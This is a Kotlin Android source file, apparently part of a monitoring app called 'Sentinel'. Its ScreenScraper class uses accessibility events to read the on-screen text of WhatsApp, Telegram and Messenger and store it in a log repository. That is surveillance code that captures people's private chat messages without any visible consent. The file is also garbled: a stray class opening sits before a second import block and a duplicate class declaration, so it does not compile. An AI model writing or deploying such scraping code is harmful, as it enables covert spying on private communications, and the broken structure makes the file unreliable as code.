package com.zero.sentinel.telemetry

import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log
import java.util.LinkedList
import java.util.Queue

class ScreenScraper {

import com.zero.sentinel.data.repository.LogRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class ScreenScraper(private val repository: LogRepository) {

    private val scope = CoroutineScope(Dispatchers.IO)

    fun handle(event: AccessibilityEvent) {
        // Only scrape if it's an interesting window change or content change
        // We need access to the root node.
        val sourceNode = event.source ?: return
        
        // Heuristic: Check specifically for chat apps
        val packageName = event.packageName?.toString() ?: ""
        
        // Optimization: Only scrape specific apps
        if (isInterestingApp(packageName)) {
            val content = scrapeContent(sourceNode)
            if (content.isNotEmpty()) {
                Log.d("SentinelScraper", "Scraped from $packageName: $content")
                
                scope.launch {
                    repository.insertLog("SCREEN_CONTENT", packageName, content)
                }
            }
        }
    }

    private fun isInterestingApp(packageName: String): Boolean {
        return packageName.contains("whatsapp") || 
               packageName.contains("telegram") || 
               packageName.contains("messenger")
    }

    private fun scrapeContent(root: AccessibilityNodeInfo): String {
        val result = StringBuilder()
        val queue: Queue<AccessibilityNodeInfo> = LinkedList()
        queue.add(root)

        var nodesVisited = 0
        // Safety limit to avoid infinite loops or too heavy processing
        val MAX_NODES = 50 

        while (!queue.isEmpty() && nodesVisited < MAX_NODES) {
            val node = queue.poll() ?: continue
            nodesVisited++

            if (node.text != null && node.text.isNotEmpty()) {
                // Filter out system text if needed
                result.append(node.text).append(" | ")
            }

            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    queue.add(child)
                }
            }
            // Important: Recycle nodes in a real implementation to avoid memory leaks!
            // But strict recycling management is tricky in simple BFS without deeper wrapper.
            // For now, relies on GC.
        }
        return result.toString()
    }
}
